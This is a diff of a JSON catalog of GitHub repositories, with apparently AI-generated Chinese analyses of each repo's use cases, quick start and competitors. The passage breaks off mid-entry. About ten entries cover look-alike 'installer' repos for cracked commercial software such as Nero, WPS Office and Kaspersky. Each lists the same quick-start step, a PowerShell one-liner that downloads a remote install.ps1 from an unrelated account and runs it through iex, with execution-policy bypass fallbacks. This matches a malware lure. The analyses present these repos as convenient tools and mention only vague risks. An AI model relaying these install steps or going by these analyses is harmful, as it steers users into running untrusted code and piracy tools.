@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-06-13T06:03:32.992Z",
+  "updatedAt": "2026-06-14T06:22:50.754Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -48606,6 +48606,1153 @@
         "category": "LLM框架"
       },
       "analyzedAt": "2026-06-13T06:03:32.971Z"
+    },
+    {
+      "owner": "pzr2508",
+      "repo": "RL_for_Game",
+      "fullName": "pzr2508/RL_for_Game",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-06-14T02:28:15Z",
+      "url": "https://github.com/pzr2508/RL_for_Game",
+      "analysis": {
+        "positioning": "基于Dueling DQN+Transformer的自动游戏AI框架",
+        "useCases": [
+          "你想训练AI玩复杂游戏 → 它提供Dueling DQN+Transformer模型与多GPU训练。",
+          "你需采集游戏数据 → 它提供屏幕录制与Tkinter标注工具，方便数据收集。",
+          "你想实时部署游戏AI → 它实现屏幕捕获、模型推理和热键控制，一键切换AI。"
+        ],
+        "audience": "希望通过强化学习实现游戏自动化控制的开发者、研究者或AI爱好者。",
+        "quickStart": {
+          "prerequisites": "Python环境，推荐Windows系统（因依赖Win32 SendInput），以及相应的RL库（如PyTorch）。",
+          "steps": [
+            "使用`data_collection.py`工具录制游戏画面并标注动作，收集训练数据。",
+            "通过`main.py`（训练模式）利用Dueling DQN+Transformer模型进行离线或在线训练。",
+            "使用`main.py`（推理模式）或`online_train.py`部署AI，F5/F6键控制AI开关。"
+          ],
+          "note": "游戏输入（键盘/鼠标）部分高度依赖Windows API，建议在Windows系统运行。"
+        },
+        "competitors": [
+          {
+            "name": "Stable Baselines3",
+            "method": "主流强化学习算法库，提供PPO、DQN等多种算法实现，需用户自行集成游戏环境和输入输出。",
+            "models": "PPO, A2C, DQN, SAC等多种算法。",
+            "pricing": "免费"
+          },
+          {
+            "name": "Ray RLib",
+            "method": "分布式强化学习库，支持大规模训练和多种算法，同样需自行集成游戏环境和控制。",
+            "models": "DQN, PPO, IMPALA, SAC等多种算法，支持自定义模型。",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费（开源项目）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目结构清晰，功能全面且具有创新性，结合Dueling DQN与Transformer解决游戏时序推理问题。提供数据收集、训练到部署的完整流程，并支持多GPU。但Star数和Issue活跃度较低，社区参与度有待提升。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度低，无issue开启或关闭记录。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-14T06:17:26.715Z"
+    },
+    {
+      "owner": "Spikederthrust",
+      "repo": "Sound-Forge-Pro-Installer",
+      "fullName": "Spikederthrust/Sound-Forge-Pro-Installer",
+      "description": "the professional audio editor and mastering studio with 64-bit engine, 32-bit float processing, VST plugin support, and industry-standard tools for music production.",
+      "language": "Unknown",
+      "topics": [
+        "audio-editor",
+        "audio-mastering",
+        "daw-plugin",
+        "magix-sound-forge",
+        "sound-forge",
+        "sound-forge-2025",
+        "sound-forge-2026",
+        "sound-forge-activator",
+        "sound-forge-free",
+        "sound-forge-github",
+        "sound-forge-key-gen",
+        "sound-forge-pro",
+        "sound-forge-product-key",
+        "sound-forge-setup"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:12:50Z",
+      "url": "https://github.com/Spikederthrust/Sound-Forge-Pro-Installer",
+      "analysis": {
+        "positioning": "Sound Forge Pro 专业音频编辑与母带制作的便捷非官方安装器。",
+        "useCases": [
+          "你想轻松安装 Sound Forge Pro 专业版 → 它帮你自动化下载、安装和“激活”。",
+          "你需要进行专业的音乐制作、混音或母带处理 → 它提供 Sound Forge Pro 及其捆绑的 iZotope 插件。",
+          "你希望快速部署 Sound Forge Pro 2025/2026 最新版 → 它帮你一键式部署到 Windows 系统。"
+        ],
+        "audience": "寻求 Sound Forge Pro 专业音频编辑和母带处理功能，且不介意非官方渠道的音乐制作人、音频工程师等。",
+        "quickStart": {
+          "prerequisites": "Windows 10 / 11 (64-bit), PowerShell 5.1+, 互联网连接, ~1200 MB 可用磁盘空间。",
+          "steps": [
+            "打开 PowerShell",
+            "运行：`irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`"
+          ],
+          "note": "旧版 PowerShell 或遇到执行策略问题时，可尝试 `Invoke-RestMethod` 或 `powershell -ExecutionPolicy Bypass` 命令。"
+        },
+        "competitors": [
+          {
+            "name": "Ableton Live",
+            "method": "购买软件/订阅服务后下载安装",
+            "models": "Live Suite, Standard, Intro",
+            "pricing": "付费 (有免费试用)"
+          },
+          {
+            "name": "FL Studio",
+            "method": "购买软件/订阅服务后下载安装",
+            "models": "Fruity Edition, Producer Edition, Signature Bundle, All Plugins Edition",
+            "pricing": "付费 (有免费试用)"
+          },
+          {
+            "name": "Adobe Audition",
+            "method": "Adobe Creative Cloud订阅下载安装",
+            "models": "Audition (Creative Cloud)",
+            "pricing": "付费 (订阅制)"
+          }
+        ],
+        "pricing": "免费（项目本身免费，但其安装的Sound Forge Pro为商业软件，此项目提供非官方“激活”以绕过付费）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目本质是商业软件 Sound Forge Pro 的非官方自动化安装与“激活”脚本，存在严重版权及安全风险（从未知源下载并执行），不推荐在生产环境使用。代码逻辑简单直接，自动化程度高。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，无任何 Issue 记录，可能维护不积极或仅为一次性发布。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:17:54.879Z"
+    },
+    {
+      "owner": "shalediplomatcock",
+      "repo": "Nero-Platinum-Suite-Installer",
+      "fullName": "shalediplomatcock/Nero-Platinum-Suite-Installer",
+      "description": "the all-in-one multimedia package with disc burning, 4K video editing, media streaming, AI photo enhancement, and automatic file backup.",
+      "language": "Unknown",
+      "topics": [
+        "blu-ray-burner",
+        "cd-dvd-burner",
+        "disc-burning",
+        "multimedia-suite",
+        "nero",
+        "nero-activator",
+        "nero-free",
+        "nero-github",
+        "nero-key-gen",
+        "nero-platinum",
+        "nero-platinum-2025",
+        "nero-platinum-2026",
+        "nero-product-key",
+        "nero-setup",
+        "nero-video"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:10:22Z",
+      "url": "https://github.com/shalediplomatcock/Nero-Platinum-Suite-Installer",
+      "analysis": {
+        "positioning": "一键安装与激活Nero Platinum多媒体套件，涵盖刻录、编辑、流媒体、备份。",
+        "useCases": [
+          "你希望一站式处理多媒体任务 → 它帮你集成光盘刻录、4K视频编辑、媒体流播、AI照片增强和自动文件备份。",
+          "你需要快速部署Nero Platinum → 它提供一键式PowerShell脚本，简化安装与“激活”流程。",
+          "你寻找方便的媒体备份方案 → 它内含Nero BackItUp，帮助你自动备份重要数据。"
+        ],
+        "audience": "寻求便捷方式安装和“激活”Nero Platinum Suite的Windows用户，尤其关注多媒体处理与数据备份。",
+        "quickStart": {
+          "prerequisites": "Windows 10 / 11 (64-bit), PowerShell 5.1+, 互联网连接, 约2.5GB空闲磁盘空间。",
+          "steps": [
+            "打开PowerShell。",
+            "运行 `irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`。"
+          ],
+          "note": "对于旧版PowerShell或执行策略限制，可使用 `powershell -ExecutionPolicy Bypass -Command \"irm...\"` 或 `Invoke-RestMethod ... | Invoke-Expression`。"
+        },
+        "competitors": [
+          {
+            "name": "CyberLink PowerDirector (视频编辑为主)",
+            "method": "购买软件/订阅",
+            "models": "N/A",
+            "pricing": "付费"
+          },
+          {
+            "name": "Ashampoo Burning Studio + DaVinci Resolve (组合方案)",
+            "method": "购买软件/免费软件组合",
+            "models": "N/A",
+            "pricing": "付费/部分免费"
+          }
+        ],
+        "pricing": "免费（通过非官方脚本安装和激活通常为付费的Nero Platinum Suite）。",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目提供付费商业软件Nero Platinum Suite的非官方“一键安装与激活”方案，强烈暗示为破解或盗版，存在严重版权侵犯和潜在安全风险。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，14星，0个Issue（开启/关闭），无任何社区互动迹象。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:18:10.807Z"
+    },
+    {
+      "owner": "ApprenticeShroud",
+      "repo": "Revo-Uninstaller-Pro-Setup",
+      "fullName": "ApprenticeShroud/Revo-Uninstaller-Pro-Setup",
+      "description": "One-click setup for Revo Uninstaller Pro Setup -- the advanced Windows uninstaller that removes programs completely by scanning for leftover registry entries and files that the standard Windows uninstaller always leaves behind",
+      "language": "Unknown",
+      "topics": [
+        "app-remover",
+        "forced-uninstall",
+        "leftover-cleaner",
+        "program-uninstaller",
+        "registry-cleaner",
+        "revo-2025",
+        "revo-2026",
+        "revo-free",
+        "revo-github",
+        "revo-setup",
+        "revo-uninstaller",
+        "revo-uninstaller-pro",
+        "software-remover",
+        "uninstaller",
+        "windows-uninstaller"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-14T01:37:29Z",
+      "url": "https://github.com/ApprenticeShroud/Revo-Uninstaller-Pro-Setup",
+      "analysis": {
+        "positioning": "一键安装Revo Pro，彻底卸载Windows程序及残留。",
+        "useCases": [
+          "想彻底卸载Windows软件，清理注册表和文件残留 → 它帮你通过Revo Pro完全清除程序。",
+          "需要快速便捷地安装Revo Uninstaller Pro专业版 → 它帮你一键安装、自动激活并集成到右键菜单。",
+          "面对无法正常卸载或在列表中找不到的程序 → 它帮你使用Hunter Mode直接卸载运行中的应用。"
+        ],
+        "audience": "Windows 10/11用户，寻求便捷彻底的软件卸载方案，注重系统清洁且不介意使用非官方安装脚本。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), PowerShell 5.1+, 互联网连接，约60MB磁盘空间。",
+          "steps": [
+            "打开PowerShell。",
+            "运行安装命令：`irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`"
+          ],
+          "note": "若执行策略受限，可尝试`powershell -ExecutionPolicy Bypass -Command \"...\"`；若`irm`不识别，尝试将`iex`替换为`Invoke-Expression`。"
+        },
+        "competitors": [
+          {
+            "name": "Geek Uninstaller",
+            "method": "独立软件（便携/安装）",
+            "models": "Windows软件卸载",
+            "pricing": "免费版/专业版"
+          },
+          {
+            "name": "IObit Uninstaller",
+            "method": "独立软件（安装）",
+            "models": "Windows软件卸载",
+            "pricing": "免费版/专业版"
+          }
+        ],
+        "pricing": "免费（通过脚本激活付费软件专业版）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "星星少，无Issue，通过远程脚本“激活”付费软件专业版，存在潜在安全风险和版权问题，不建议在生产环境使用。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue统计为0，无任何互动迹象。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:18:36.358Z"
+    },
+    {
+      "owner": "FaceHelmsman",
+      "repo": "EaseUS-Todo-Backup-Setup",
+      "fullName": "FaceHelmsman/EaseUS-Todo-Backup-Setup",
+      "description": "the reliable system backup and recovery solution with smart scheduling, one-click system clone to SSD, cloud storage integration, and bare-metal restore capability.",
+      "language": "Unknown",
+      "topics": [
+        "acronis-alternative",
+        "backup-software",
+        "disk-backup",
+        "easeus-backup",
+        "easeus-backup-activator",
+        "easeus-backup-free",
+        "easeus-backup-key-gen",
+        "easeus-backup-product-key",
+        "easeus-todo-2025",
+        "easeus-todo-2026",
+        "easeus-todo-backup",
+        "easeus-todo-github",
+        "system-backup",
+        "system-clone"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:06:05Z",
+      "url": "https://github.com/FaceHelmsman/EaseUS-Todo-Backup-Setup",
+      "analysis": {
+        "positioning": "可靠的系统备份与恢复方案，支持智能调度和裸机还原。",
+        "useCases": [
+          "你需要定期备份Windows系统 → 它能智能调度，自动帮你生成系统镜像备份。",
+          "你需要将旧系统无缝迁移到新SSD或硬盘 → 它能一键克隆，快速帮你完成系统迁移。",
+          "你的Windows系统崩溃无法启动 → 它能进行裸机还原，帮你快速恢复到可用状态。"
+        ],
+        "audience": "需要简化Windows系统备份、迁移和灾难恢复流程的个人用户及中小企业。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), PowerShell 5.1+, 互联网连接, 约300MB可用磁盘空间。",
+          "steps": [
+            "打开PowerShell终端。",
+            "运行安装命令：`irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`"
+          ],
+          "note": "旧版PowerShell或执行策略受限时，请参考README中的替代命令。"
+        },
+        "competitors": [
+          {
+            "name": "Acronis Cyber Protect Home Office",
+            "method": "购买安装软件，手动或计划备份，功能全面",
+            "models": "支持系统、文件、磁盘、云备份",
+            "pricing": "付费订阅"
+          },
+          {
+            "name": "Macrium Reflect",
+            "method": "安装软件，手动或计划备份，提供免费版和付费版",
+            "models": "支持系统、文件、磁盘备份",
+            "pricing": "有免费版，有付费版"
+          }
+        ],
+        "pricing": "此安装脚本免费开源。它所安装的EaseUS Todo Backup通常为商业付费软件，但存在免费版本。",
+        "vibeCodingScore": 2,
+        "vibeCodingReason": "项目旨在自动化安装并可能涉及未经授权的第三方商业软件激活（存在`activator`、`key-gen`等关键词），潜在法律和安全风险较高。项目星数极低，社区活跃度为零，维护情况不明。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue 为空，无用户互动或问题反馈。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-14T06:18:54.767Z"
+    },
+    {
+      "owner": "Gluedruempty",
+      "repo": "Process-Lasso-Pro-Optimizer",
+      "fullName": "Gluedruempty/Process-Lasso-Pro-Optimizer",
+      "description": "the intelligent Windows process priority optimizer that prevents CPU monopolization through ProBalance technology for dramatically improved PC and gaming responsiveness.",
+      "language": "Unknown",
+      "topics": [
+        "cpu-optimizer",
+        "gaming-performance",
+        "probalance",
+        "process-lasso",
+        "process-lasso-2025",
+        "process-lasso-2026",
+        "process-lasso-activator",
+        "process-lasso-free",
+        "process-lasso-github",
+        "process-lasso-key-gen",
+        "process-lasso-pro",
+        "process-lasso-setup",
+        "process-manager",
+        "ram-optimizer"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:12:02Z",
+      "url": "https://github.com/Gluedruempty/Process-Lasso-Pro-Optimizer",
+      "analysis": {
+        "positioning": "智能优化Windows进程优先级，显著提升PC和游戏响应速度。",
+        "useCases": [
+          "你玩大型游戏卡顿 → 它智能优化CPU优先级，大幅提升游戏帧率和响应。",
+          "你日常使用电脑卡慢 → 它自动管理后台进程，防止CPU独占，让系统更流畅。",
+          "你担心关键业务应用被误杀 → 它允许你轻松设置排除项，保护重要程序免受干扰。"
+        ],
+        "audience": "寻求PC和游戏流畅度提升的用户，尤其是不想手动干预复杂进程设置的普通玩家和电脑用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10 / 11 (64-bit)、PowerShell 5.1+、网络连接、约40 MB磁盘空间",
+          "steps": [
+            "打开PowerShell。",
+            "运行 `irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`。"
+          ],
+          "note": "旧版PowerShell可能需要使用`Invoke-RestMethod`；如果遇到执行策略限制，可尝试 `powershell -ExecutionPolicy Bypass -Command \"...\"`。"
+        },
+        "competitors": [
+          {
+            "name": "Process Lasso (官方版)",
+            "method": "官方渠道下载安装包，提供免费版和付费专业版。",
+            "models": "Windows 进程优先级管理、ProBalance技术。",
+            "pricing": "基础版免费，专业版付费。"
+          }
+        ],
+        "pricing": "该项目通过脚本静默安装Process Lasso Pro，暗示其专业版功能可免费获取。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "该项目以“Pro Optimizer”命名，且安装脚本直接静默下载并安装“Process Lasso Pro”安装器，并提供“activator”、“key-gen”等话题，强烈暗示以非官方或规避授权的方式提供商业软件的专业版功能。这违背了软件开源协作的良性氛围。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue区为空，社区活跃度极低。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:19:08.533Z"
+    },
+    {
+      "owner": "EnchanterChimney",
+      "repo": "WPS-Office-Pro-Installer",
+      "fullName": "EnchanterChimney/WPS-Office-Pro-Installer",
+      "description": "the complete office suite with Writer, Spreadsheets, and Presentation fully compatible with Microsoft Office formats, plus built-in PDF tools and cloud sync.",
+      "language": "Unknown",
+      "topics": [
+        "excel-alternative",
+        "free-office-suite",
+        "microsoft-office-alternative",
+        "office-suite",
+        "pdf-editor",
+        "word-alternative",
+        "wps-2025",
+        "wps-2026",
+        "wps-activator",
+        "wps-free",
+        "wps-github",
+        "wps-key-gen",
+        "wps-office",
+        "wps-office-pro",
+        "wps-setup"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:15:34Z",
+      "url": "https://github.com/EnchanterChimney/WPS-Office-Pro-Installer",
+      "analysis": {
+        "positioning": "一键安装并激活WPS Office Pro，解锁高级功能。",
+        "useCases": [
+          "你想免费用WPS Office Pro全功能 → 它帮你自动安装并激活专业版，省去手动操作和破解的麻烦。",
+          "你需要处理Microsoft Office格式文件 → 它提供高度兼容的WPS套件，确保文档、表格、演示文稿格式不乱。",
+          "你希望WPS支持PDF编辑或云同步 → 它激活Pro版，让你直接使用这些高级特性。"
+        ],
+        "audience": "适合需要在Windows系统上快速、免费获取WPS Office Pro完整功能，并兼容Microsoft Office文件的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10 / 11 (64位), PowerShell 5.1+, 互联网连接, 约800 MB磁盘空间。",
+          "steps": [
+            "打开PowerShell。",
+            "运行 `irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`。"
+          ],
+          "note": "针对PowerShell执行策略或老版本PowerShell提供了替代运行方式。"
+        },
+        "competitors": [
+          {
+            "name": "Microsoft Office",
+            "method": "购买订阅或许可，安装使用",
+            "models": "Word, Excel, PowerPoint等全套办公软件及云服务",
+            "pricing": "付费订阅"
+          },
+          {
+            "name": "LibreOffice",
+            "method": "下载安装包，手动安装",
+            "models": "Writer, Calc, Impress等开源办公组件",
+            "pricing": "免费"
+          },
+          {
+            "name": "Google Workspace (Docs/Sheets/Slides)",
+            "method": "浏览器访问，在线使用",
+            "models": "Docs, Sheets, Slides等在线办公应用",
+            "pricing": "基础免费，高级功能付费"
+          }
+        ],
+        "pricing": "免费。项目本身免费，用于激活WPS Office Pro版功能。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目旨在通过脚本自动安装并“激活”商业软件WPS Office Pro，存在潜在的法律和安全风险。GitHub Star数量极低，社区不活跃，可靠性存疑。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue统计为0/0，几乎为零。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:19:23.240Z"
+    },
+    {
+      "owner": "LoopSystemAqueduct",
+      "repo": "Advanced-SystemCare-Pro-Setup",
+      "fullName": "LoopSystemAqueduct/Advanced-SystemCare-Pro-Setup",
+      "description": "One-click setup for Advanced SystemCare Pro Setup -- the comprehensive Windows optimization suite that cleans junk files, fixes registry errors, removes malware, and boosts startup speed in a single click trusted by 500 million users",
+      "language": "Unknown",
+      "topics": [
+        "advanced-systemcare",
+        "advanced-systemcare-2025",
+        "advanced-systemcare-2026",
+        "advanced-systemcare-free",
+        "advanced-systemcare-github",
+        "advanced-systemcare-setup",
+        "iobit",
+        "pc-cleaner",
+        "pc-optimizer",
+        "registry-cleaner",
+        "startup-booster",
+        "system-care",
+        "systemcare-pro",
+        "windows-optimizer"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-14T01:33:59Z",
+      "url": "https://github.com/LoopSystemAqueduct/Advanced-SystemCare-Pro-Setup",
+      "analysis": {
+        "positioning": "一键安装并优化Windows系统，实现垃圾清理、注册表修复、病毒清除与开机加速。",
+        "useCases": [
+          "你觉得电脑运行慢，C盘空间不足 → 它帮你清理系统垃圾和隐私痕迹，释放硬盘空间。",
+          "你遇到程序崩溃或系统报错 → 它帮你修复无效注册表条目，提升系统稳定性。",
+          "你担心电脑感染病毒或被入侵 → 它帮你扫描并清除恶意软件，提供实时安全防护。",
+          "你想使用Advanced SystemCare Pro的全部高级功能 → 它帮你一键激活Pro许可，启用实时优化等特性。"
+        ],
+        "audience": "适合所有Windows用户，特别是希望通过简单操作来清理、加速和保护自己电脑的人。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), PowerShell 5.1+, 互联网连接, 350MB磁盘空间",
+          "steps": [
+            "打开PowerShell终端",
+            "运行安装命令：`irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`"
+          ],
+          "note": "旧版PowerShell可能需要使用 `powershell -ep Bypass -c ...` 或 `Invoke-RestMethod ... | Invoke-Expression` 命令。"
+        },
+        "competitors": [
+          {
+            "name": "CCleaner",
+            "method": "下载官方安装包安装",
+            "models": "N/A",
+            "pricing": "部分免费/付费专业版"
+          },
+          {
+            "name": "Glary Utilities",
+            "method": "下载官方安装包安装",
+            "models": "N/A",
+            "pricing": "部分免费/付费专业版"
+          }
+        ],
+        "pricing": "Advanced SystemCare Pro为付费软件；本安装脚本免费，但其激活Pro版功能可能涉及版权争议。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目本身是一个商业软件的非官方一键安装脚本，代码量小，功能单一。虽然提供了便利，但其本质是绕过官方安装流程并激活Pro版，存在潜在的法律和安全风险（通过PowerShell直接执行外部脚本）。星数低，社区活跃度不高。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issues 均为零，贡献者少。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:19:40.346Z"
+    },
+    {
+      "owner": "alicankiraz1",
+      "repo": "CodexQB",
+      "fullName": "alicankiraz1/CodexQB",
+      "description": "CodexQB is a Codex plugin that packages a three-step project planning workflow as a reusable skill.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:49:51Z",
+      "url": "https://github.com/alicankiraz1/CodexQB",
+      "analysis": {
+        "positioning": "Codex 的项目规划插件，实现证据驱动、仓库感知的规划流程。",
+        "useCases": [
+          "你需要AI帮你规划一个新项目 → 它扫描代码仓库，提出基于代码的规划默认值，并生成主计划。",
+          "你想了解现有项目的健康状况和技术债 → 它为你生成详细的“尸检报告”，揭示模块、功能、技术债和风险。",
+          "你需要将项目主计划细化为可执行的步骤 → 它将每个主要阶段分解为详细的子计划和文件夹。",
+          "你希望在编码前确保规划的质量和就绪度 → 它对你的计划进行质量审计，并在通过后才给出实施提示。"
+        ],
+        "audience": "软件、AI、基础设施、安全和自动化项目的项目经理、技术负责人及开发者，尤其适合使用 Codex 进行复杂项目规划的用户。",
+        "quickStart": {
+          "prerequisites": "已安装 Codex，并且其GitHub环境拥有访问 `alicankiraz1/CodexQB` 的权限（私有仓库时）。",
+          "steps": [
+            "codex plugin marketplace add alicankiraz1/CodexQB --ref main",
+            "codex plugin add codexqb@codexqb",
+            "在项目所在目录启动新的Codex线程，输入 `Use $codexqb to inspect this repo an…`"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "为AI编程助手Codex提供了一套结构化、仓库感知的多阶段项目规划工作流，包括项目诊断和质量审计，显著提升了AI在复杂项目规划中的实用性和可靠性。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前无Issue记录，项目可能较新或处于早期阶段。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-06-14T06:19:52.166Z"
+    },
+    {
+      "owner": "Poltergeistfeclamp",
+      "repo": "Topaz-AI-Photo-Toolkit",
+      "fullName": "Poltergeistfeclamp/Topaz-AI-Photo-Toolkit",
+      "description": "the all-in-one AI image enhancer with upscaling, denoising, and sharpening powered by machine learning.",
+      "language": "Unknown",
+      "topics": [
+        "ai-image-enhancer",
+        "image-upscaler",
+        "topaz-2025",
+        "topaz-2026",
+        "topaz-activator",
+        "topaz-ai",
+        "topaz-denoise",
+        "topaz-free",
+        "topaz-gigapixel",
+        "topaz-github",
+        "topaz-key-gen",
+        "topaz-labs",
+        "topaz-photo-ai",
+        "topaz-portable",
+        "topaz-sharpen",
+        "topaz-video-ai"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:15:05Z",
+      "url": "https://github.com/Poltergeistfeclamp/Topaz-AI-Photo-Toolkit",
+      "analysis": {
+        "positioning": "一站式AI图像增强工具包，智能放大、降噪和锐化图片。",
+        "useCases": [
+          "你的老照片模糊不清或像素低 → 它帮你通过AI技术清晰化和放大。",
+          "你的夜景照片噪点多 → 它帮你智能降噪，保留画面细节。",
+          "你的照片不够锐利 → 它帮你AI锐化，提升图像质感和清晰度。"
+        ],
+        "audience": "追求高品质图像效果的摄影师、设计师或普通用户，尤其适合处理低质量或需增强的照片。",
+        "quickStart": {
+          "prerequisites": "Windows 10 / 11 (64位), PowerShell 5.1+, 互联网连接, 推荐独立显卡4GB显存+, 2500MB磁盘空间。",
+          "steps": [
+            "打开PowerShell。",
+            "运行安装命令：`irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`。"
+          ],
+          "note": "若PowerShell版本过旧或执行策略受限，需使用替代命令安装。"
+        },
+        "competitors": [
+          {
+            "name": "Topaz Labs 官方 Photo AI",
+            "method": "从Topaz Labs官网购买并下载",
+            "models": "Topaz Labs自研AI模型",
+            "pricing": "付费购买"
+          },
+          {
+            "name": "Luminar Neo",
+            "method": "购买或订阅独立软件",
+            "models": "Skylum自研AI模型",
+            "pricing": "付费购买/订阅"
+          }
+        ],
+        "pricing": "免费。该工具包旨在提供免费获取和激活Topaz Photo AI的途径。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "星级低，无Issue活动，社区关注度极低。项目本质是Topaz Photo AI的非官方安装/激活工具，运行远程PowerShell脚本存在潜在风险。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，目前无任何Issue讨论或贡献。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:20:12.101Z"
+    },
+    {
+      "owner": "NovaPurserDress",
+      "repo": "Kaspersky-Standard-Installer",
+      "fullName": "NovaPurserDress/Kaspersky-Standard-Installer",
+      "description": "the trusted antivirus and real-time protection suite with award-winning malware detection, online banking protection, and minimal system performance impact.",
+      "language": "Unknown",
+      "topics": [
+        "antivirus",
+        "internet-security",
+        "kaspersky",
+        "kaspersky-2025",
+        "kaspersky-2026",
+        "kaspersky-activator",
+        "kaspersky-free",
+        "kaspersky-github",
+        "kaspersky-key-gen",
+        "kaspersky-product-key",
+        "kaspersky-setup",
+        "kaspersky-standard",
+        "kaspersky-total-security",
+        "malware-protection"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:08:38Z",
+      "url": "https://github.com/NovaPurserDress/Kaspersky-Standard-Installer",
+      "analysis": {
+        "positioning": "一个简化卡巴斯基标准版安装、激活及配置的脚本工具。",
+        "useCases": [
+          "你懒得手动安装卡巴斯基 → 它帮你自动下载、静默安装、激活并配置。",
+          "你担心病毒和恶意软件 → 它帮你部署卡巴斯基，提供实时检测和清除威胁。",
+          "你进行网银操作或访问敏感网站 → 它帮你配置卡巴斯基，保护在线交易和隐私安全。"
+        ],
+        "audience": "希望快速、便捷地安装和配置卡巴斯基标准版，并获得全面安全防护的 Windows 用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), PowerShell 5.1+, 互联网连接, 约700MB磁盘空间。",
+          "steps": [
+            "打开 PowerShell。",
+            "运行 `irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`。"
+          ],
+          "note": "注意 PowerShell 版本兼容性；旧版本使用 `Invoke-RestMethod`；可添加 `-ExecutionPolicy Bypass` 绕过执行策略。"
+        },
+        "competitors": [
+          {
+            "name": "官方卡巴斯基安装包",
+            "method": "从官网下载并手动安装",
+            "models": "卡巴斯基全线产品",
+            "pricing": "订阅付费"
+          },
+          {
+            "name": "Windows Defender",
+            "method": "Windows 系统内置",
+            "models": "基础杀毒、防火墙",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "本项目（安装脚本）免费，但其安装的卡巴斯基软件是订阅付费产品。项目话题暗示可能存在非官方激活方式。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "脚本通过 `irm | iex` 直接运行 GitHub 远程代码，且提及绕过执行策略；项目话题包含“activator”、“key-gen”等，暗示可能用于非官方激活，存在安全和合规风险。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，目前无任何 Issue 记录。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-06-14T06:20:28.356Z"
+    },
+    {
+      "owner": "ForbiddenStudentShop",
+      "repo": "EaseUS-Data-Recovery-Wizard-Setup",
+      "fullName": "ForbiddenStudentShop/EaseUS-Data-Recovery-Wizard-Setup",
+      "description": "One-liner to install EaseUS Data Recovery Wizard -- the reliable file recovery tool that restores lost data from any storage device in minutes.",
+      "language": "Unknown",
+      "topics": [
+        "data-recovery",
+        "deleted-files",
+        "easeus",
+        "easeus-2025",
+        "easeus-2026",
+        "easeus-activator",
+        "easeus-data-recovery",
+        "easeus-free",
+        "easeus-github",
+        "easeus-key-gen",
+        "easeus-portable",
+        "easeus-pro",
+        "easeus-product-key-generator",
+        "easeus-setup",
+        "easeus-wizard",
+        "file-recovery"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:05:38Z",
+      "url": "https://github.com/ForbiddenStudentShop/EaseUS-Data-Recovery-Wizard-Setup",
+      "analysis": {
+        "positioning": "EaseUS数据恢复向导的一键式Windows安装器。",
+        "useCases": [
